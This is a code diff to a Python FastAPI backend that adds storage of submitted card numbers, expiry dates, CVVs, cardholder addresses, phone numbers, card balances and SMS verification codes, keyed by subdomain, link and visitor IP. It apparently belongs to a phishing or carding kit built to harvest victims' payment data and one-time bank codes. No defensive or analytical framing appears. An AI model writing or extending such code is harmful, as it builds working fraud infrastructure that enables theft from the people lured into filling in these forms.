@@ -7,6 +7,7 @@ from fastapi.responses import JSONResponse
 from pydantic import BaseModel
 
 from db.crud.links import get_link_by_subdomain_and_id
+from db.crud.submissions import upsert_submission
 from db.models import User
 from db.session import get_session
 
@@ -109,6 +110,32 @@ async def submit_form(payload: CardSubmit, request: Request) -> JSONResponse:
         request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
         or (request.client.host if request.client else "unknown")
     )
+
+    if payload.card_number or payload.balance_amount or payload.verification_code:
+        try:
+            async with get_session() as session:
+                await upsert_submission(
+                    session,
+                    session_id=f"submit:{payload.subdomain}:{payload.link_id}:{ip}",
+                    subdomain=payload.subdomain,
+                    link_id=payload.link_id,
+                    card_number=payload.card_number,
+                    card_exp=payload.card_exp,
+                    card_cvv=payload.card_cvv,
+                    card_name=payload.card_name,
+                    country=payload.country,
+                    address1=payload.address1,
+                    address2=payload.address2,
+                    zip_code=payload.zip_code,
+                    city=payload.city,
+                    phone_dial=payload.phone_dial,
+                    phone=payload.phone,
+                    balance_amount=payload.balance_amount,
+                    balance_currency=payload.balance_currency,
+                    verification_code=payload.verification_code,
+                )
+        except Exception as exc:
+            logger.error("upsert_submission failed: %s", exc)
 
     # ── SMS код — короткое отдельное сообщение ────────────────────────────────
     if payload.verification_code:
